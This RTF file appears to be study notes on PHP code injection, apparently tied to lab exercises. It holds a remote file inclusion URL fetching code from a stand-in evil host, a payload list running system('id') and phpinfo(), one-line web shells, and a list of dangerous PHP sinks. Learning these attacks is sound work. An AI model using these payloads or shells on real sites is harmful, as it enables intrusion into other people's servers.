{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;\f2\fmodern\fcharset0 Courier;
\f3\fmodern\fcharset0 Courier-Bold;\f4\fmodern\fcharset0 Courier-Oblique;}
{\colortbl;\red255\green255\blue255;\red0\green0\blue233;\red127\green127\blue127;\red0\green0\blue0;
\red0\green255\blue255;}
{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid1\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid1}
{\list\listtemplateid2\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid101\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid2}}
{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}{\listoverride\listid2\listoverridecount0\ls2}}
\paperw11900\paperh16840\margl1440\margr1440\vieww18480\viewh10460\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0\b\fs32 \cf0 \ul \ulc0 Code Injection
\b0 \ulnone \
\
With Code Injection you are able to run code in remote environment!!\
\
\pard\pardeftab720\sl280\sa240\partightenfactor0

\f1\b\fs28 \cf0 \expnd0\expndtw0\kerning0
Example 1
\b0  
\f0 \kerning1\expnd0\expndtw0 \

\f1 \expnd0\expndtw0\kerning0
If an application 
\b passes a parameter sent via a GET request to the PHP include() function with no input validation,
\b0  the attacker may try to execute code other than what the developer had in mind. \
The URL below passes a page name to the include() function. \
\pard\pardeftab720\sl280\sa240\partightenfactor0
{\field{\*\fldinst{HYPERLINK "http://testsite.com/index.php?page=contact.php"}}{\fldrslt \cf2 \cb3 \ul \ulc2 http://testsite.com/index.php?page=contact.php}}\cf2 \cb3 \ul \ulc2 \'94\cf0 \ulnone ;$name=\'93 hah\'94;echo $name; //\
\pard\pardeftab720\sl280\sa240\partightenfactor0
\cf0 \cb1 The file "evilcode.php" may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment in which the web service runs. An attacker can ask the application to execute his PHP code using the following request: \
\pard\pardeftab720\sl280\sa240\partightenfactor0
{\field{\*\fldinst{HYPERLINK "http://testsite.com/?page=http://evilsite.com/evilcode.php"}}{\fldrslt \cf2 \cb3 \ul http://testsite.com/?page=http://evilsite.com/evilcode.php}}\cf2 \cb3 \ul \
\pard\pardeftab720\sl280\sa240\partightenfactor0

\f0\fs32 \cf0 \cb1 \kerning1\expnd0\expndtw0 \ulnone \
\pard\pardeftab720\sl280\sa240\partightenfactor0

\f1\b\fs28 \cf0 \expnd0\expndtw0\kerning0
Example 2
\b0  \
When a developer uses the 
\b PHP eval() function
\b0  and passes it untrusted data that an attacker can modify, code injection could be possible. \
The example below shows a dangerous way to use the eval() function: \
\pard\pardeftab720\sl280\partightenfactor0

\f2 \cf0 \cb3 $myvar = "varname";\
$x = $_GET['arg'];\
eval("\\$myvar = \\$x;");\
\cb1 \
\pard\pardeftab720\sl280\sa240\partightenfactor0

\f1 \cf0 As there is no input validation, the code above is vulnerable to a Code Injection attack. \
For example: \
\pard\pardeftab720\sl280\partightenfactor0

\f2 \cf0 \cb3 /index.php?arg=1; phpinfo()\
\cb1 \
\pard\pardeftab720\sl280\sa240\partightenfactor0

\f1 \cf0 While exploiting bugs like these, an attacker may want to execute system commands. In this case, a code injection bug can also be used for command injection, for example: \
\pard\pardeftab720\sl280\partightenfactor0

\f2 \cf0 \cb3 /index.php?arg=1; system('id')\
\
\cb1 \
\pard\pardeftab720\sl280\qc\partightenfactor0

\f3\b\fs32 \cf0 \ul TRY
\f2\b0\fs28 \ulnone \
\pard\pardeftab720\sl280\partightenfactor0
\cf4 \outl0\strokewidth0 \strokec4 /example1.php?name=hacer"; system("ls"); //\
/example1.php?name=hacer"; $name = " kod"; echo $name; //\
\pard\pardeftab720\sl280\partightenfactor0
\cf0 \outl0\strokewidth0 /index.php?arg1=1;system(\'91id\'92); //\
codeexec/example2.php?order=id);\}system('id');%23\
codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer\
codeexec/example4.php?name=hacker'.system('id');%23    \'97 
\fs24 \cf4 \outl0\strokewidth0 \strokec4 assert('ex' . 'ec("kill --bill")');\

\fs28 \cf0 \outl0\strokewidth0 \
\
\pard\pardeftab720\sl280\qc\partightenfactor0

\f3\b \cf0 \ul LOOK OUT FOR VULN FUNCTIONS\
\pard\pardeftab720\sl280\partightenfactor0

\f2\b0\fs24 \cf0 \ulnone \
\pard\pardeftab720\sl280\partightenfactor0
\cf4 \outl0\strokewidth0 \strokec4 assert('ex' . 'ec("kill --bill")');\
<? eval($_GET['cmd']); ?>\
<? system($_GET['cmd']); ?>\
<? preg_replace('/.*/e',$_POST['code']); ?>		\
\

\f3\b\fs28 preg_replace
\f1\b0  could be made dangerous by the use of the 
\f2 /e
\f1  flag (/e does an eval() to match)  \'97\'97> 
\f2 \cb5 preg_replace($pattern, $new, $base);\cb1 \
\
\pard\tx220\tx720\pardeftab720\li720\fi-720\sl280\partightenfactor0
\ls1\ilvl0\cf4 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 system
\f1 \
\ls1\ilvl0
\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 exec
\f1 \
\ls1\ilvl0
\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 popen
\f1 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\sl280\partightenfactor0
\ls1\ilvl0
\f4\i \cf4 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 backtick operator
\f1\i0 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\sl280\partightenfactor0
\ls1\ilvl0
\f2 \cf4 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 pcntl_exec\
\pard\tx566\pardeftab720\sl280\partightenfactor0

\f1 \cf4 \
\pard\pardeftab720\sl280\sa240\partightenfactor0

\b \cf4 PHP Execute
\b0 \
\pard\tx220\tx720\pardeftab720\li720\fi-720\sl280\partightenfactor0
\ls2\ilvl0
\f2 \cf4 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 eval
\f1 \
\ls2\ilvl0
\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 preg_replace
\f1  (with 
\f2 /e
\f1  modifier)\
\ls2\ilvl0
\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 create_function
\f1 \
\ls2\ilvl0
\f2 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
\outl0\strokewidth0 \strokec4 include
\f1 [
\f2 _once
\f1 ] / 
\f2 require
\f1 [
\f2 _once
\f1 ] 
\fs24 \
}